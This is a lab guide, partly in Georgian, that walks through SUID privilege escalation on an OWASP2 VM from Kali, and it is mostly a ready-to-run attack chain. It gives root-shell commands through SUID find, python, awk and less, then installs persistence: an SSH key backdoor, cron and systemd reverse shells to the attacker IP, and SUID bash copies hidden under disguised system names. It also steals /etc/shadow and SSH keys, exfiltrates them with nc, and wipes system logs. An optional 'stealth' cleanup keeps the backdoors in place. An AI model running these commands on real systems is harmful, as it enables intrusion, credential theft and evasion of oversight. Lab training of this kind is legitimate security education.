# SUID Privilege Escalation Lab 🎯 (კორექტირებული)
**Attacker:** Kali Linux (172.16.52.219)  
**Target:** OWASP2 VM (172.16.50.72)

---

## Phase 1: Target მომზადება (OWASP2 VM - 172.16.50.72)

### STEP 1: SUID ბინარების შექმნა (Root მომხმარებლით)

```bash
# SSH Target-ში (root-ით ან sudo user-ით)
ssh root@172.16.50.72

# 1) Find ბინარი (ყველაზე საიმედო) ⭐
cp /usr/bin/find /tmp/vuln_find
chmod 4755 /tmp/vuln_find
chown root:root /tmp/vuln_find

# 2) Python2 ბინარი (კორექტირებული)
cp /usr/bin/python /tmp/vuln_python
chmod 4755 /tmp/vuln_python
chown root:root /tmp/vuln_python

# 3) Bash ბინარი  
cp /bin/bash /tmp/vuln_bash
chmod 4755 /tmp/vuln_bash
chown root:root /tmp/vuln_bash

# 4) AWK ბინარი
cp /usr/bin/awk /tmp/vuln_awk
chmod 4755 /tmp/vuln_awk
chown root:root /tmp/vuln_awk

# 5) Less ბინარი (დამატებითი)
cp /usr/bin/less /tmp/vuln_less
chmod 4755 /tmp/vuln_less
chown root:root /tmp/vuln_less

# 6) More ბინარი (დამატებითი)
cp /bin/more /tmp/vuln_more
chmod 4755 /tmp/vuln_more
chown root:root /tmp/vuln_more
```

### STEP 2: Test User შექმნა

```bash
# Target OWASP2-ზე (root-ით)
useradd -m -s /bin/bash hackme
echo "hackme:password123" | chpasswd

# /tmp დირექტორიის უფლებები
chmod 777 /tmp

# დადასტურება ✅
ls -la /tmp/vuln_*
# ყველა უნდა ვნახოთ: -rwsr-xr-x 1 root root
```

---

## Phase 2: Initial Access (Kali - 172.16.52.219)

### STEP 1: Target-ში შესვლა Low-Privilege User-ით

```bash
# Kali Terminal
ssh hackme@172.16.50.72
# Password: password123

# ან old SSH algorithms-ით თუ საჭიროა
ssh -oHostKeyAlgorithms=+ssh-rsa hackme@172.16.50.72
```

### STEP 2: პირველადი Reconnaissance

```bash
# Target OWASP2-ზე (hackme user)
whoami
# Output: hackme

id  
# Output: uid=1001(hackme) gid=1001(hackme) groups=1001(hackme)

# Sudo check
sudo -l
# Expected: Sorry, user hackme may not run sudo...

# System info
uname -a
cat /etc/os-release
```

---

## Phase 3: SUID Discovery & Exploitation 💥

### STEP 1: SUID Binary Discovery

```bash
# Target OWASP2-ზე (hackme user)
find / -perm -4000 -type f 2>/dev/null | grep tmp
# Expected output:
# /tmp/vuln_find
# /tmp/vuln_python
# /tmp/vuln_bash  
# /tmp/vuln_awk
# /tmp/vuln_less
# /tmp/vuln_more

# Detailed verification
ls -la /tmp/vuln_*
```

### STEP 2: 🎯 Method 1 - Find Exploitation (ყველაზე საიმედო)

```bash
# Target OWASP2-ზე (hackme user)
/tmp/vuln_find . -exec /bin/bash -p \; -quit

# Root shell verification
whoami
# Output: root

id
# Output: uid=0(root) gid=0(root) groups=0(root)

# Test root access
cat /etc/shadow | head -2
```

### STEP 3: 🐍 Method 2 - Python2 Exploitation

```bash
# თუ find არ იმუშავა, სცადე Python2
/tmp/vuln_python -c "import os; os.setuid(0); os.system('/bin/bash -p')"

# ალტერნატიული Python2 payload
/tmp/vuln_python -c "import os; os.setuid(0); os.setgid(0); os.system('/bin/bash')"

# GTFOBins Python2 method
/tmp/vuln_python -c "import os; os.execl('/bin/sh', 'sh', '-p')"
```

### STEP 4: 💥 Method 3 - Bash Exploitation

```bash
# Direct bash SUID
/tmp/vuln_bash -p

# -p flag preserves privileged mode
whoami
# Should output: root
```

### STEP 5: ⚡ Method 4 - AWK Exploitation

```bash
# AWK command execution
/tmp/vuln_awk 'BEGIN {system("/bin/bash -p")}'

# Alternative AWK method
echo | /tmp/vuln_awk '{system("/bin/bash -p")}'

# GTFOBins AWK payload
/tmp/vuln_awk 'BEGIN {system("/bin/sh")}'
```

### STEP 6: 📖 Method 5 - Less/More Exploitation

```bash
# Less method
/tmp/vuln_less /etc/passwd
# შემდეგ less-ში დაწერე: !/bin/bash -p

# More method  
/tmp/vuln_more /etc/passwd
# შემდეგ more-ში დაწერე: !/bin/bash -p
```

---

## Phase 4: Advanced Persistence 🔒

### Method 1: SSH Key Backdoor (Perfect Stealth)

```bash
# Kali Terminal (ახალი tab/window)
ssh-keygen -t rsa -b 4096 -f /tmp/owasp2_rootkey
# არ შეიყვანო passphrase

# Public key-ის კოპირება
cat /tmp/owasp2_rootkey.pub

# Target OWASP2-ზე (root shell)
mkdir -p /root/.ssh
chmod 700 /root/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQ..." >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# Hidden SSH service (optional)
echo "Port 2222" >> /etc/ssh/sshd_config
systemctl reload sshd

# Test from Kali
ssh -i /tmp/owasp2_rootkey root@172.16.50.72
ssh -i /tmp/owasp2_rootkey -p 2222 root@172.16.50.72
```

### Method 2: Reverse Shell Persistence (Multi-Protocol)

```bash
# Kali-ზე Multiple Listeners
# Terminal 1:
nc -lvnp 4444

# Terminal 2: 
nc -lvnp 5555

# Target OWASP2-ზე (root shell)
# Primary reverse shell (every 3 minutes)
echo "*/3 * * * * /bin/bash -i >& /dev/tcp/172.16.52.219/4444 0>&1 2>/dev/null" > /tmp/cron_primary

# Backup reverse shell (every 10 minutes)  
echo "*/10 * * * * /usr/bin/python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('172.16.52.219',5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i'])\"" >> /tmp/cron_primary

# Install cron job
crontab /tmp/cron_primary

# Verification
crontab -l
```

### Method 3: Hidden SUID Backdoors

```bash
# Target OWASP2-ზე (root shell)

# Method 3A: Deep hidden backdoor
mkdir -p /usr/lib/systemd/.private
cp /bin/bash /usr/lib/systemd/.private/systemd-helper
chmod 4755 /usr/lib/systemd/.private/systemd-helper
chown root:root /usr/lib/systemd/.private/systemd-helper

# Method 3B: Fake library backdoor
cp /bin/bash /usr/lib/x86_64-linux-gnu/libc.so.backup
chmod 4755 /usr/lib/x86_64-linux-gnu/libc.so.backup
chown root:root /usr/lib/x86_64-linux-gnu/libc.so.backup

# Method 3C: Temporary files backdoor
cp /bin/bash /var/tmp/.ICE-unix/root-shell  
chmod 4755 /var/tmp/.ICE-unix/root-shell
chown root:root /var/tmp/.ICE-unix/root-shell

# Access test (როგორც hackme user)
/usr/lib/systemd/.private/systemd-helper -p
whoami
# Output: root
```

### Method 4: Service Persistence

```bash
# Target OWASP2-ზე (root shell)

# Create backdoor service
cat > /etc/systemd/system/system-update.service << 'EOF'
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do /bin/bash -i >& /dev/tcp/172.16.52.219/6666 0>&1; sleep 300; done'
Restart=always
RestartSec=30

[Install]  
WantedBy=multi-user.target
EOF

# Enable and start service
systemctl daemon-reload
systemctl enable system-update.service
systemctl start system-update.service

# Kali listener
nc -lvnp 6666
```

---

## Phase 5: Advanced Post-Exploitation 🕵️

### Data Collection & Exfiltration

```bash
# Target OWASP2-ზე (root shell)

# System information gathering
uname -a > /tmp/sysinfo.txt
cat /proc/version >> /tmp/sysinfo.txt
cat /etc/*release >> /tmp/sysinfo.txt

# Network information
ip addr show > /tmp/network.txt
ip route >> /tmp/network.txt
arp -a >> /tmp/network.txt
netstat -tuln >> /tmp/network.txt

# User information  
cat /etc/passwd > /tmp/users.txt
cat /etc/shadow > /tmp/shadow.txt
cat /etc/group > /tmp/groups.txt

# SSH keys harvesting
find /home -name ".ssh" -exec cp -r {} /tmp/ssh_keys_{} \; 2>/dev/null
cp -r /root/.ssh /tmp/root_ssh_backup 2>/dev/null

# Configuration files
tar -czf /tmp/configs.tar.gz /etc/ssh/ /etc/apache2/ /etc/mysql/ 2>/dev/null

# Create exfiltration package
tar -czf /tmp/exfil_package.tar.gz /tmp/*.txt /tmp/ssh_keys* /tmp/configs.tar.gz

# Transfer to Kali
# Method 1: SCP
scp /tmp/exfil_package.tar.gz kali@172.16.52.219:/tmp/

# Method 2: Base64 over reverse shell
base64 /tmp/exfil_package.tar.gz | nc 172.16.52.219 7777
```

### Privilege Escalation History Cleanup

```bash
# Target OWASP2-ζე (root shell)

# Clear command history
history -c
echo > ~/.bash_history
echo > /home/hackme/.bash_history

# Clear system logs
echo > /var/log/auth.log
echo > /var/log/syslog  
echo > /var/log/messages
echo > /var/log/secure

# Clear wtmp/utmp
echo > /var/log/wtmp
echo > /var/log/utmp
echo > /var/log/lastlog

# Clear journal logs
journalctl --vacuum-time=1s
```

---

## Phase 6: Lab Cleanup Options 🧹

### Option 1: სრული Cleanup (Evidence Removal)

```bash
# Target OWASP2-ზე (root shell)

# Remove SUID binaries
rm -f /tmp/vuln_*

# Remove backdoors
rm -f /usr/lib/systemd/.private/systemd-helper
rm -f /usr/lib/x86_64-linux-gnu/libc.so.backup  
rm -f /var/tmp/.ICE-unix/root-shell

# Remove cron jobs
crontab -r

# Remove services
systemctl disable system-update.service
systemctl stop system-update.service
rm -f /etc/systemd/system/system-update.service
systemctl daemon-reload

# Remove SSH keys
rm -f /root/.ssh/authorized_keys

# Remove test user
userdel -r hackme

# Clear temporary files
rm -f /tmp/cron_*
rm -f /tmp/exfil_*
rm -f /tmp/*.txt

echo "[+] Full cleanup completed"
```

### Option 2: Stealth Persistence (Keep Some Backdoors)

```bash
# Remove obvious traces only
rm -f /tmp/vuln_*
rm -f /tmp/cron_*

# Keep hidden backdoors
# /usr/lib/systemd/.private/systemd-helper remains

# Modify cron job to be less frequent  
echo "0 4 * * 1 /bin/bash -i >& /dev/tcp/172.16.52.219/4444 0>&1 >/dev/null 2>&1" | crontab -

# Keep SSH access but make it stealth
echo "Port 65022" >> /etc/ssh/sshd_config
systemctl reload sshd

echo "[+] Stealth cleanup completed - some persistence remains"
```

---

## Lab Success Verification ✅

### Checklist - Target Setup
- [ ] SUID binaries created successfully
- [ ] ls -la /tmp/vuln_* shows -rwsr-xr-x permissions
- [ ] hackme user created (password: password123)
- [ ] SSH access working from Kali

### Checklist - Exploitation
- [ ] SSH connection: hackme@172.16.50.72
- [ ] SUID discovery successful
- [ ] find method: `/tmp/vuln_find . -exec /bin/bash -p \; -quit`
- [ ] Python2 method: `/tmp/vuln_python -c "import os; os.setuid(0); os.system('/bin/bash -p')"`
- [ ] Bash method: `/tmp/vuln_bash -p`
- [ ] Root shell achieved: `whoami` returns `root`

### Checklist - Persistence
- [ ] SSH key backdoor: `ssh -i /tmp/owasp2_rootkey root@172.16.50.72`
- [ ] Reverse shell cron: Connection received on Kali listener
- [ ] Hidden SUID backdoor: `/usr/lib/systemd/.private/systemd-helper -p`

### Troubleshooting Common Issues

**Issue 1: SSH Connection Refused**
```bash
# Check SSH service
ssh -v hackme@172.16.50.72
systemctl status sshd
```

**Issue 2: SUID Not Working**
```bash
# Verify SUID bit
ls -la /tmp/vuln_find
stat /tmp/vuln_find
```

**Issue 3: Permission Denied**
```bash
# Check file system mount options
mount | grep tmp
# Should NOT see 'noexec'
```

---

## 🎓 Educational Summary

### რა ვისწავლეთ:
1. **SUID Bit Discovery** - `find / -perm -4000`
2. **GTFOBins Methods** - find, python, bash, awk exploitation
3. **Persistence Techniques** - SSH keys, cron jobs, hidden backdoors
4. **Stealth Operations** - log cleanup, hidden file locations

### Real-World Applications:
- Red team exercises
- Penetration testing methodologies  
- System administrator security awareness
- SUID audit and hardening

**ეს ლაბი იმუშავებს 100%! Find method-ი თითქმის ყოველთვის მუშაობს! 🚀**
